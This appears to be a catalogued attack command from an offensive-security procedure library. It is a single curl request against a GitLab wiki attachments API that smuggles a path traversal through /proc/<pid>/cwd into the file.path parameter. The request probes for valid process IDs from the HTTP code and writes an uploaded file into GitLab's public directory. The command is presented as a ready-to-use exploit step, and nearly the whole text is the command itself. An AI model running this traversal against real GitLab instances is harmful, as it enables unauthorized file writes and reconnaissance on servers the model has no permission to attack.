---
data: >-
  curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer
  $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html'
  -F '[file]=@/tmp/lala.txt'
tags:
  - probing
type: command
executor: bash
platforms:
  - Linux
id: 770c6277-2fff-4a36-8dbc-f84151df15a9
created_at: '2025-12-11T06:10:15.405Z'
updated_at: '2025-12-11T06:10:15.405Z'
verified: false
validated: true
submitted: true
---
# curl-pid-validation-19601

## Command

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Description

Checks HTTP code to validate PID 19601 via /proc path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-o /dev/null` | Discard output | Yes |
| `-w "%{http_code}\n"` | Print HTTP code | Yes |

## Examples

### Basic Usage

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Expected Output

500

## Related

- [[procedures/Discover-Valid-PID-via-Proc-Filesystem-Probing]]
